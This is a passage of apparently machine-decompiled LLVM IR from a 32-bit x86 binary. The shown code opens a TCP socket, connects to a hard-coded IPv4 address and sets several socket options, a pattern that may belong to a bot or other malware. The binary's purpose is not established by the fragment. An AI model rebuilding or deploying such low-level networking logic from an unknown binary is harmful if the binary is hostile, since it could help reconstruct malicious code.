  store i32 %v0_80509ac, i32* @eax, align 4
  %v0_80509ae = call i32 @function_804f2d0()
  store i32 %v0_80509ae, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fece

dec_label_pc_80509b8:                             ; preds = %dec_label_pc_8050339
  store i32 %v0_80509b8, i32* @eax, align 4
  store i32 -1, i32* @ebp, align 4
  %v0_80509bd = call i32 @function_804f2d0()
  store i32 %v0_80509bd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050383

dec_label_pc_80509c7:                             ; preds = %dec_label_pc_805089e
  %v1_80509c7 = add i32 %v0_80508b5, 1
  %v8_80509c7 = icmp eq i32 %v1_80509c7, 0
  store i32 %v1_80509c7, i32* %eax.global-to-local, align 4
  br i1 %v8_80509c7, label %dec_label_pc_80508c2, label %dec_label_pc_80509ce

dec_label_pc_80509ce:                             ; preds = %dec_label_pc_80509c7
  %v0_80509ce = load i32, i32* @ecx, align 4
  %v1_80509ce = load i32, i32* @esp, align 4
  %v2_80509ce = add i32 %v1_80509ce, -4
  %v3_80509ce = inttoptr i32 %v2_80509ce to i32*
  store i32 %v0_80509ce, i32* %v3_80509ce, align 4
  %v1_80509cf = add i32 %v1_80509ce, -8
  %v2_80509cf = inttoptr i32 %v1_80509cf to i32*
  store i32 0, i32* %v2_80509cf, align 4
  %v1_80509d1 = add i32 %v1_80509ce, -12
  %v2_80509d1 = inttoptr i32 %v1_80509d1 to i32*
  store i32 1, i32* %v2_80509d1, align 4
  %v1_80509d3 = add i32 %v1_80509ce, -16
  %v2_80509d3 = inttoptr i32 %v1_80509d3 to i32*
  store i32 2, i32* %v2_80509d3, align 4
  %v3_80509d5 = call i32 @function_8052275(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80509d5, i32* @eax, align 4
  %v0_80509da = load i32, i32* @esp, align 4
  %sext6 = mul i32 %v3_80509d5, 16777216
  %v1_80509dd = sdiv i32 %sext6, 16777216
  store i32 %v1_80509dd, i32* @ebx, align 4
  %tmp278 = icmp eq i32 %sext6, -16777216
  br i1 %tmp278, label %dec_label_pc_804fc64, label %dec_label_pc_80509e8

dec_label_pc_80509e8:                             ; preds = %dec_label_pc_80509ce
  %v1_80509e8 = add i32 %v0_80509da, 1828
  %v2_80509e8 = inttoptr i32 %v1_80509e8 to i16*
  store i16 2, i16* %v2_80509e8, align 2
  %v0_80509f2 = load i32, i32* @esp, align 4
  %v1_80509f2 = add i32 %v0_80509f2, 1816
  %v2_80509f2 = inttoptr i32 %v1_80509f2 to i32*
  store i32 1674493113, i32* %v2_80509f2, align 4
  %v0_80509fd = load i32, i32* @esp, align 4
  %v1_8050a00 = add i32 %v0_80509fd, -16
  %v2_8050a00 = inttoptr i32 %v1_8050a00 to i32*
  store i32 19, i32* %v2_8050a00, align 4
  %v2_8050a02 = call i32 @function_8050be0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050a02, i32* %eax.global-to-local, align 4
  %v0_8050a07 = load i32, i32* @esp, align 4
  %v1_8050a07 = inttoptr i32 %v0_8050a07 to i32*
  %v2_8050a07 = load i32, i32* %v1_8050a07, align 4
  store i32 %v2_8050a07, i32* %eax.global-to-local, align 4
  %v3_8050a07 = add i32 %v0_8050a07, 4
  %v1_8050a08 = inttoptr i32 %v3_8050a07 to i32*
  %v2_8050a08 = load i32, i32* %v1_8050a08, align 4
  store i32 %v2_8050a08, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8050a08, align 4
  store i32 19, i32* %v1_8050a07, align 4
  %v3_8050a0d = call i32 @function_8050b30(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  %v4_8050a0d = inttoptr i32 %v3_8050a0d to i16*
  store i32 %v3_8050a0d, i32* %eax.global-to-local, align 4
  %v3_8050a12 = load i16, i16* %v4_8050a0d, align 2
  %v4_8050a12 = zext i16 %v3_8050a12 to i32
  %v7_8050a12 = and i32 %v3_8050a0d, -65536
  %v8_8050a12 = or i32 %v4_8050a12, %v7_8050a12
  store i32 %v8_8050a12, i32* %eax.global-to-local, align 4
  %v0_8050a15 = load i32, i32* @esp, align 4
  %v1_8050a15 = inttoptr i32 %v0_8050a15 to i32*
  store i32 19, i32* %v1_8050a15, align 4
  %v0_8050a1c = load i32, i32* %eax.global-to-local, align 4
  %v1_8050a1c = trunc i32 %v0_8050a1c to i16
  %v2_8050a1c = load i32, i32* @esp, align 4
  %v3_8050a1c = add i32 %v2_8050a1c, 1830
  %v4_8050a1c = inttoptr i32 %v3_8050a1c to i16*
  store i16 %v1_8050a1c, i16* %v4_8050a1c, align 2
  %v2_8050a24 = call i32 @function_8050b60(i8 ptrtoint (i32* @0 to i8))
  %v0_8050a29 = load i32, i32* @esp, align 4
  %v1_8050a29 = add i32 %v0_8050a29, 1828
  store i32 %v1_8050a29, i32* %eax.global-to-local, align 4
  %v1_8050a33 = add i32 %v0_8050a29, 8
  %v2_8050a33 = inttoptr i32 %v1_8050a33 to i32*
  store i32 16, i32* %v2_8050a33, align 4
  %v0_8050a35 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050a35 = add i32 %v0_8050a29, 4
  %v3_8050a35 = inttoptr i32 %v2_8050a35 to i32*
  store i32 %v0_8050a35, i32* %v3_8050a35, align 4
  %v0_8050a36 = load i32, i32* @ebx, align 4
  %v3_8050a36 = inttoptr i32 %v0_8050a29 to i32*
  store i32 %v0_8050a36, i32* %v3_8050a36, align 4
  %v3_8050a37 = call i32 @function_805209a(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8050a3c = load i32, i32* @esp, align 4
  %v1_8050a3f = add i32 %v3_8050a37, 1
  %v8_8050a3f = icmp eq i32 %v1_8050a3f, 0
  store i32 %v1_8050a3f, i32* %eax.global-to-local, align 4
  %v1_8050a40 = icmp eq i1 %v8_8050a3f, false
  br i1 %v1_8050a40, label %dec_label_pc_8050a80, label %dec_label_pc_8050a42

dec_label_pc_8050a42:                             ; preds = %dec_label_pc_80509e8
  br label %dec_label_pc_8050a45

dec_label_pc_8050a45:                             ; preds = %dec_label_pc_8050a80, %dec_label_pc_8050a42
  %storemerge.in = phi i32 [ %v0_8050a3c, %dec_label_pc_8050a42 ], [ %v0_8050b1b, %dec_label_pc_8050a80 ]
  %v0_8050a45 = load i32, i32* @ebx, align 4
  %v3_8050a45 = inttoptr i32 %storemerge.in to i32*
  store i32 %v0_8050a45, i32* %v3_8050a45, align 4
  %v1_8050a46 = call i32 @function_8051a81(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050a46, i32* @eax, align 4
  %v0_8050a4b = load i32, i32* @esp, align 4
  %v1_8050a4b = inttoptr i32 %v0_8050a4b to i32*
  store i32 0, i32* %v1_8050a4b, align 4
  %v1_8050a52 = call i32 @function_80535c9(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050a52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050a57

dec_label_pc_8050a57:                             ; preds = %dec_label_pc_804ff5d, %dec_label_pc_804ff17, %dec_label_pc_8050a45
  %v0_8050a57 = load i32, i32* @esp, align 4
  %v0_8050a5a = load i32, i32* @edi, align 4
  %v1_8050a5a = add i32 %v0_8050a5a, 4
  %v2_8050a5a = inttoptr i32 %v1_8050a5a to i32*
  %v3_8050a5a = load i32, i32* %v2_8050a5a, align 4
  store i32 %v3_8050a5a, i32* %eax.global-to-local, align 4
  %v2_8050a5d = add i32 %v0_8050a57, -16
  %v3_8050a5d = inttoptr i32 %v2_8050a5d to i32*
  store i32 %v3_8050a5a, i32* %v3_8050a5d, align 4
  %v1_8050a5e = call i32 @function_8051a81(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050a5e, i32* %eax.global-to-local, align 4
  %v0_8050a66 = load i32, i32* @edi, align 4
  %v1_8050a66 = add i32 %v0_8050a66, 4
  %v2_8050a66 = inttoptr i32 %v1_8050a66 to i32*
  store i32 -1, i32* %v2_8050a66, align 4
  %v0_8050a6d = load i32, i32* @edi, align 4
  %v1_8050a6d = add i32 %v0_8050a6d, 284
  %v2_8050a6d = inttoptr i32 %v1_8050a6d to i8*
  store i8 0, i8* %v2_8050a6d, align 1
  %v0_8050a74 = load i32, i32* @edi, align 4
  %v1_8050a74 = add i32 %v0_8050a74, 12
  %v2_8050a74 = inttoptr i32 %v1_8050a74 to i32*
  store i32 0, i32* %v2_8050a74, align 4
  br label %dec_label_pc_804fece

dec_label_pc_8050a80:                             ; preds = %dec_label_pc_80509e8
  %v1_8050a80 = add i32 %v0_8050a3c, 1864
  %v2_8050a80 = inttoptr i32 %v1_8050a80 to i8*
  store i8 0, i8* %v2_8050a80, align 1
  %v0_8050a88 = load i32, i32* @esp, align 4
  %v1_8050a88 = add i32 %v0_8050a88, -4
  %v2_8050a88 = inttoptr i32 %v1_8050a88 to i32*
  store i32 16384, i32* %v2_8050a88, align 4
  %v1_8050a8d = add i32 %v0_8050a88, -8
  %v2_8050a8d = inttoptr i32 %v1_8050a8d to i32*
  store i32 1, i32* %v2_8050a8d, align 4
  %v1_8050a8f = add i32 %v0_8050a88, 1848
  store i32 %v1_8050a8f, i32* %ecx.global-to-local, align 4
  %v2_8050a96 = add i32 %v0_8050a88, -12
  %v3_8050a96 = inttoptr i32 %v2_8050a96 to i32*
  store i32 %v1_8050a8f, i32* %v3_8050a96, align 4
  %v0_8050a97 = load i32, i32* @ebx, align 4
  %v2_8050a97 = add i32 %v0_8050a88, -16
  %v3_8050a97 = inttoptr i32 %v2_8050a97 to i32*
  store i32 %v0_8050a97, i32* %v3_8050a97, align 4
  %v0_8050a98 = call i32 @function_80521c4()
  %v0_8050a9d = load i32, i32* @esp, align 4
  %v1_8050a9d = add i32 %v0_8050a9d, -4
  %v2_8050a9d = inttoptr i32 %v1_8050a9d to i32*
  store i32 16384, i32* %v2_8050a9d, align 4
  %v1_8050aa2 = add i32 %v0_8050a9d, -8
  %v2_8050aa2 = inttoptr i32 %v1_8050aa2 to i32*
  store i32 4, i32* %v2_8050aa2, align 4
  %v1_8050aa4 = add i32 %v0_8050a9d, 1872
  store i32 %v1_8050aa4, i32* %eax.global-to-local, align 4
  %v2_8050aab = add i32 %v0_8050a9d, -12
  %v3_8050aab = inttoptr i32 %v2_8050aab to i32*
  store i32 %v1_8050aa4, i32* %v3_8050aab, align 4
  %v0_8050aac = load i32, i32* @ebx, align 4
  %v2_8050aac = add i32 %v0_8050a9d, -16
  %v3_8050aac = inttoptr i32 %v2_8050aac to i32*
  store i32 %v0_8050aac, i32* %v3_8050aac, align 4
  %v0_8050aad = call i32 @function_80521c4()
  %v0_8050ab2 = load i32, i32* @esp, align 4
  %v1_8050ab5 = add i32 %v0_8050ab2, 28
  %v2_8050ab5 = inttoptr i32 %v1_8050ab5 to i32*
  store i32 16384, i32* %v2_8050ab5, align 4
  %v1_8050aba = add i32 %v0_8050ab2, 24
  %v2_8050aba = inttoptr i32 %v1_8050aba to i32*
  store i32 2, i32* %v2_8050aba, align 4
  %v1_8050abc = add i32 %v0_8050ab2, 1898
  store i32 %v1_8050abc, i32* %eax.global-to-local, align 4
  %v2_8050ac3 = add i32 %v0_8050ab2, 20
  %v3_8050ac3 = inttoptr i32 %v2_8050ac3 to i32*
  store i32 %v1_8050abc, i32* %v3_8050ac3, align 4
  %v0_8050ac4 = load i32, i32* @ebx, align 4
  %v2_8050ac4 = add i32 %v0_8050ab2, 16
  %v3_8050ac4 = inttoptr i32 %v2_8050ac4 to i32*
  store i32 %v0_8050ac4, i32* %v3_8050ac4, align 4
  %v0_8050ac5 = call i32 @function_80521c4()
  %v0_8050aca = load i32, i32* @esi, align 4
  %v1_8050aca = add i32 %v0_8050aca, 12
  store i32 %v1_8050aca, i32* %eax.global-to-local, align 4
  %v0_8050acd = load i32, i32* @esp, align 4
  %v1_8050acd = add i32 %v0_8050acd, -4
  %v2_8050acd = inttoptr i32 %v1_8050acd to i32*
  store i32 16384, i32* %v2_8050acd, align 4
  %v1_8050ad2 = add i32 %v0_8050acd, -8
  %v2_8050ad2 = inttoptr i32 %v1_8050ad2 to i32*
  store i32 1, i32* %v2_8050ad2, align 4
  %v0_8050ad4 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050ad4 = add i32 %v0_8050acd, -12
  %v3_8050ad4 = inttoptr i32 %v2_8050ad4 to i32*
  store i32 %v0_8050ad4, i32* %v3_8050ad4, align 4
  %v0_8050ad5 = load i32, i32* @ebx, align 4
  %v2_8050ad5 = add i32 %v0_8050acd, -16
  %v3_8050ad5 = inttoptr i32 %v2_8050ad5 to i32*
  store i32 %v0_8050ad5, i32* %v3_8050ad5, align 4
  %v0_8050ad6 = call i32 @function_80521c4()
  %v0_8050adb = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8050ae0 = add i32 %v0_8050adb, 28
  %v2_8050ae0 = inttoptr i32 %v1_8050ae0 to i32*
  store i32 16384, i32* %v2_8050ae0, align 4
  %v0_8050ae5 = load i32, i32* @esi, align 4
  %v1_8050ae5 = add i32 %v0_8050ae5, 12
  %v2_8050ae5 = inttoptr i32 %v1_8050ae5 to i8*
  %v3_8050ae5 = load i8, i8* %v2_8050ae5, align 1
  %v4_8050ae5 = zext i8 %v3_8050ae5 to i32
  %v5_8050ae5 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050ae5 = and i32 %v5_8050ae5, -256
  %v7_8050ae5 = or i32 %v6_8050ae5, %v4_8050ae5
  store i32 %v7_8050ae5, i32* %eax.global-to-local, align 4
  %v2_8050ae8 = add i32 %v0_8050adb, 24
  %v3_8050ae8 = inttoptr i32 %v2_8050ae8 to i32*
  store i32 %v7_8050ae5, i32* %v3_8050ae8, align 4
  %v0_8050ae9 = load i32, i32* @esi, align 4
  %v1_8050ae9 = inttoptr i32 %v0_8050ae9 to i32*
  %v2_8050ae9 = load i32, i32* %v1_8050ae9, align 4
  store i32 %v2_8050ae9, i32* %eax.global-to-local, align 4
  %v2_8050aeb = add i32 %v0_8050adb, 20
  %v3_8050aeb = inttoptr i32 %v2_8050aeb to i32*
  store i32 %v2_8050ae9, i32* %v3_8050aeb, align 4
  %v0_8050aec = load i32, i32* @ebx, align 4
  %v2_8050aec = add i32 %v0_8050adb, 16
  %v3_8050aec = inttoptr i32 %v2_8050aec to i32*
  store i32 %v0_8050aec, i32* %v3_8050aec, align 4
  %v0_8050aed = call i32 @function_80521c4()
  %v0_8050af2 = load i32, i32* @esi, align 4
  %v1_8050af2 = add i32 %v0_8050af2, 13
  store i32 %v1_8050af2, i32* %eax.global-to-local, align 4
  %v0_8050af5 = load i32, i32* @esp, align 4
  %v1_8050af5 = add i32 %v0_8050af5, -4
  %v2_8050af5 = inttoptr i32 %v1_8050af5 to i32*
  store i32 16384, i32* %v2_8050af5, align 4
  %v1_8050afa = add i32 %v0_8050af5, -8
  %v2_8050afa = inttoptr i32 %v1_8050afa to i32*
  store i32 1, i32* %v2_8050afa, align 4
  %v0_8050afc = load i32, i32* %eax.global-to-local, align 4
  %v2_8050afc = add i32 %v0_8050af5, -12
  %v3_8050afc = inttoptr i32 %v2_8050afc to i32*
  store i32 %v0_8050afc, i32* %v3_8050afc, align 4
  %v0_8050afd = load i32, i32* @ebx, align 4
  %v2_8050afd = add i32 %v0_8050af5, -16
  %v3_8050afd = inttoptr i32 %v2_8050afd to i32*
  store i32 %v0_8050afd, i32* %v3_8050afd, align 4
  %v0_8050afe = call i32 @function_80521c4()
  %v0_8050b03 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8050b08 = add i32 %v0_8050b03, 28
  %v2_8050b08 = inttoptr i32 %v1_8050b08 to i32*
  store i32 16384, i32* %v2_8050b08, align 4
  %v0_8050b0d = load i32, i32* @esi, align 4
  %v1_8050b0d = add i32 %v0_8050b0d, 13
  %v2_8050b0d = inttoptr i32 %v1_8050b0d to i8*
  %v3_8050b0d = load i8, i8* %v2_8050b0d, align 1
  %v4_8050b0d = zext i8 %v3_8050b0d to i32
  %v5_8050b0d = load i32, i32* %eax.global-to-local, align 4
  %v6_8050b0d = and i32 %v5_8050b0d, -256
  %v7_8050b0d = or i32 %v6_8050b0d, %v4_8050b0d
  store i32 %v7_8050b0d, i32* %eax.global-to-local, align 4
  %v2_8050b10 = add i32 %v0_8050b03, 24
  %v3_8050b10 = inttoptr i32 %v2_8050b10 to i32*
  store i32 %v7_8050b0d, i32* %v3_8050b10, align 4
  %v0_8050b11 = load i32, i32* @esi, align 4
  %v1_8050b11 = add i32 %v0_8050b11, 4
  %v2_8050b11 = inttoptr i32 %v1_8050b11 to i32*
  %v3_8050b11 = load i32, i32* %v2_8050b11, align 4
  %v2_8050b14 = add i32 %v0_8050b03, 20
  %v3_8050b14 = inttoptr i32 %v2_8050b14 to i32*
  store i32 %v3_8050b11, i32* %v3_8050b14, align 4
  %v0_8050b15 = load i32, i32* @ebx, align 4
  %v2_8050b15 = add i32 %v0_8050b03, 16
  %v3_8050b15 = inttoptr i32 %v2_8050b15 to i32*
  store i32 %v0_8050b15, i32* %v3_8050b15, align 4
  %v0_8050b16 = call i32 @function_80521c4()
  store i32 %v0_8050b16, i32* %eax.global-to-local, align 4
  %v0_8050b1b = load i32, i32* @esp, align 4
  %v1_8050b1b = inttoptr i32 %v0_8050b1b to i32*
  %v2_8050b1b = load i32, i32* %v1_8050b1b, align 4
  store i32 %v2_8050b1b, i32* @edi, align 4
  br label %dec_label_pc_8050a45

; uselistorder directives
  uselistorder i32 %v0_8050b1b, { 1, 0 }
  uselistorder i32 %v0_8050a3c, { 1, 0 }
  uselistorder i32 %v0_80509da, { 1, 0 }
  uselistorder i32 %v6_805094a, { 1, 2, 0 }
  uselistorder i32 %v0_8050936, { 1, 0, 2 }
  uselistorder i32 %v2_80508fa, { 1, 0 }
  uselistorder i32 %v3_80508f7, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80508b5, { 1, 0, 2 }
  uselistorder i32 %v0_805088d, { 2, 1, 0 }
  uselistorder i32 %v0_8050866, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v3_8050837, { 1, 0 }
  uselistorder i32 %v0_8050837, { 1, 0 }
  uselistorder i32 %v0_805082f, { 1, 0 }
  uselistorder i32 %v0_80507b8, { 1, 0 }
  uselistorder i32 %v1_8050733, { 1, 2, 0 }
  uselistorder i32 %v0_80506ee, { 1, 0 }
  uselistorder i32 %v1_8050669, { 1, 2, 0 }
  uselistorder i32 %v0_80509ac, { 1, 0 }
  uselistorder i32 %v6_8050617, { 1, 2, 0 }
  uselistorder i32 %v2_80505b1, { 1, 0, 2 }
  uselistorder i32 %v1_80505ae, { 1, 0, 2 }
  uselistorder i32 %v0_80505ab, { 1, 0 }
  uselistorder i32 %v0_80505a7, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32 %v7_8050533, { 1, 0 }
  uselistorder i32 %v0_8050533, { 1, 2, 0 }
  uselistorder i32 %v2_805008b, { 1, 0 }
  uselistorder i32 %v0_805008b, { 1, 2, 4, 3, 0 }
  uselistorder i32 %v1_805008b, { 0, 2, 1 }
  uselistorder i32 %v0_8050109117, { 1, 0 }
  uselistorder i32 %v9_8050495, { 1, 0 }
  uselistorder i32 %v1_805048e, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_805048e, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_8050465, { 2, 1, 0, 3 }
  uselistorder i32 %v9_80503de, { 1, 0 }
  uselistorder i32 %v1_80503d7, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_80503d7, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_80503ae, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8050388, { 1, 2, 0 }
  uselistorder i32 %v1_8050388, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8050383, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v0_80509b8, { 1, 0 }
  uselistorder i32 %v6_8050365, { 1, 2, 0 }
  uselistorder i32* %v1_8050849, { 2, 0, 1 }
  uselistorder i32 %v0_8050317, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v9_8050275, { 1, 0 }
  uselistorder i32 %v1_805026e, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_805026e, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_8050245, { 2, 1, 0, 3 }
  uselistorder i32 %v1_805023d, { 2, 1, 0 }
  uselistorder i32 %v9_805020c, { 1, 0 }
  uselistorder i32 %v0_8050669, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80501e2, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80501d2, { 2, 1, 0 }
  uselistorder i32 %v9_80501aa, { 1, 0 }
  uselistorder i32 %v0_80507ac, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8050183, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8050165, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8050160, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8050150, { 2, 1, 0 }
  uselistorder i32 %v9_805011f, { 1, 0 }
  uselistorder i32 %v0_80506e2, { 0, 1, 3, 2 }
  uselistorder i32 %v2_80500fd, { 1, 0 }
  uselistorder i32 %v0_80500fd, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_80500f7, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80500f7, { 0, 2, 1 }
  uselistorder i32 %v0_80500f2, { 1, 0 }
  uselistorder i32 %v0_80500cd, { 1, 0, 2 }
  uselistorder i8* %v1_80500bb, { 1, 0, 2 }
  uselistorder i32 %v1_8050098, { 1, 0, 2 }
  uselistorder i32 %v0_8050547, { 1, 0, 2 }
  uselistorder i32 %v0_805051b, { 3, 0, 1, 2 }
  uselistorder i32 %v0_8050109118, { 3, 0, 1, 2 }
  uselistorder i32 %v2_805008b16, { 1, 0 }
  uselistorder i32 %v3_8050072, { 1, 0 }
  uselistorder i32 %v0_8050072, { 7, 21, 8, 19, 9, 18, 10, 20, 11, 16, 12, 15, 0, 14, 22, 17, 13, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v1_805005d, { 0, 2, 1 }
  uselistorder i32 %v0_8050059, { 1, 0 }
  uselistorder i32 %v0_8050040, { 1, 4, 0, 2, 3, 5 }
  uselistorder i32 %v1_8050036, { 1, 0 }
  uselistorder i32 %v1_804fff9, { 2, 1, 0 }
  uselistorder i32 %v9_804ffc8, { 1, 0 }
  uselistorder i32 %v0_8050733, { 0, 1, 3, 2 }
  uselistorder i32 %v3_804ffb5, { 1, 0 }
  uselistorder i32 %v0_804ffb5, { 1, 0 }
  uselistorder i32 %v2_804ff85, { 1, 0 }
  uselistorder i32 %v2_804ff7b, { 1, 2, 0 }
  uselistorder i32 %v4_804ff71, { 0, 1, 2, 5, 3, 4, 6, 7 }
  uselistorder i32 %v0_804ff08, { 2, 0, 1 }
  uselistorder i32 %v1_804ff05, { 1, 0 }
  uselistorder i32 %v2_804ff02, { 1, 0 }
  uselistorder i32 %v3_804fef6, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v2_804fef4, { 1, 2, 0 }
  uselistorder i32 %v1_804fedd, { 1, 0 }
  uselistorder i32 %v0_804fedd, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804feb8, { 1, 0 }
  uselistorder i32 %v2_804feb5, { 1, 0 }
  uselistorder i32 %v0_804feb3, { 1, 0 }
  uselistorder i32 %v2_804fe69, { 1, 0 }
  uselistorder i32 %v1_804fe49, { 1, 0 }
  uselistorder i32 %v0_804fe49, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804fe34, { 1, 0 }
  uselistorder i32 %v3_804fe31, { 1, 0, 2, 3 }
  uselistorder i32 %v2_80508ec, { 1, 0 }
  uselistorder i32 %v1_80508e9, { 2, 1, 0 }
  uselistorder i32 %v3_804fdf9, { 1, 0, 2 }
  uselistorder i32 %v2_804fdf7, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_804fd88, { 1, 0 }
  uselistorder i32 %v1_804fd7a, { 0, 2, 1 }
  uselistorder i32 %v0_804fd7a, { 1, 0 }
  uselistorder i32 %v0_804fd83, { 2, 1, 0 }
  uselistorder i32 %v1_804fd54, { 1, 0 }
  uselistorder i32 %v0_804fd54, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32 %v4_804fd17, { 1, 2, 0 }
  uselistorder i32 %v3_804fcef, { 1, 0, 2 }
  uselistorder i32 %v0_804fc82, { 0, 2, 1 }
  uselistorder i32 %v0_804fc79, { 0, 3, 2, 1 }
  uselistorder i32 %v0_804fa5d54, { 1, 0 }
  uselistorder i32 %v0_804fc5a, { 2, 1, 0 }
  uselistorder i8 %v1_804fc2c, { 1, 0 }
  uselistorder i8 %v2_804fc06, { 0, 4, 5, 6, 7, 8, 10, 9, 3, 2, 1 }
  uselistorder i32 %v2_804fbfd, { 4, 8, 6, 1, 0, 2, 3, 5, 7 }
  uselistorder i32 %v5_804fbfb, { 3, 2, 5, 4, 1, 0 }
  uselistorder i32 %v1_804fbf5, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804fbf0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804fba4, { 1, 0 }
  uselistorder i32 %v1_804faeb, { 0, 2, 1 }
  uselistorder i32 %v0_804fa4b, { 2, 0, 1 }
  uselistorder i32 %v0_804fa09, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 6, 33, 34, 35, 7, 8, 9, 10, 28, 20, 21, 22, 37, 24, 25, 26, 18, 42, 38, 39, 29, 0, 1, 2, 3, 4, 5, 11, 12, 13, 14, 15, 16, 17, 19, 23, 27, 30, 31, 32, 40, 41, 43, 60, 44, 45, 46, 47, 36, 48, 49, 50, 51, 53, 54, 55, 52, 56, 57, 58, 59 }
  uselistorder i32* %ecx.global-to-local, { 3, 14, 11, 6, 15, 5, 17, 12, 0, 1, 2, 16, 4, 7, 8, 9, 10, 13, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %eax.global-to-local, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 119, 120, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 42, 103, 121, 122, 123, 124, 43, 45, 44, 46, 47, 48, 49, 50, 104, 105, 106, 80, 81, 82, 83, 84, 126, 127, 128, 129, 130, 131, 132, 88, 89, 90, 91, 92, 93, 94, 95, 72, 73, 74, 75, 76, 77, 138, 139, 140, 141, 113, 142, 143, 107, 108, 109, 110, 114, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 133, 134, 135, 136, 137, 52, 53, 54, 55, 51, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 78, 79, 85, 86, 87, 96, 97, 98, 99, 100, 101, 102, 111, 112, 115, 116, 117, 118, 144, 145, 146, 147, 148, 149, 150, 151, 210, 211, 212, 152, 154, 153, 155, 156, 157, 158, 159, 160, 161, 164, 165, 208, 209, 202, 162, 163, 166, 167, 168, 173, 169, 170, 171, 172, 174, 125, 175, 180, 176, 177, 178, 179, 183, 181, 182, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 40, 205, 207, 206, 195, 196, 197, 198, 199, 200, 201, 203, 204 }
  uselistorder i32 1828, { 1, 0 }
  uselistorder i32 ()* @function_8051aaf, { 1, 0 }
  uselistorder i8 31, { 0, 2, 3, 1 }
  uselistorder i32 1864, { 0, 9, 7, 1, 2, 3, 4, 11, 5, 6, 10, 8 }
  uselistorder i32 (i8)* @function_8050b60, { 2, 3, 7, 6, 0, 1, 4, 5, 8, 30, 31, 32, 33, 34, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 36, 37, 38 }
  uselistorder i32 (i32, i32*)* @function_8050b30, { 2, 3, 7, 6, 0, 1, 4, 5, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 48, 35, 54, 55, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 49, 50, 51, 52, 53 }
  uselistorder i32 1872, { 5, 0, 3, 4, 1, 2 }
  uselistorder i32 (i8)* @function_8050be0, { 2, 3, 7, 6, 0, 1, 4, 5, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i8 ptrtoint (i32* @0 to i8), { 10, 11, 12, 13, 0, 1, 6, 7, 8, 9, 4, 5, 14, 15, 2, 3 }
  uselistorder i32 ()* @function_8051590, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 4, 3, 2, 13, 1, 0, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32 ()* @function_80521c4, { 20, 19, 18, 17, 16, 15, 14, 5, 4, 9, 8, 2, 1, 7, 6, 11, 10, 24, 23, 22, 21, 13, 12, 3, 0 }
  uselistorder i8 -5, { 0, 3, 1, 2 }
  uselistorder i8 -3, { 5, 6, 7, 0, 1, 2, 3, 4 }
  uselistorder i8 65, { 1, 0 }
  uselistorder i32 ()* @function_805214e, { 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 5, 3, 2, 4, 0, 1, 6 }
  uselistorder i8 35, { 6, 4, 3, 5, 1, 0, 2 }
  uselistorder i8 36, { 6, 4, 3, 5, 1, 0, 2, 7 }
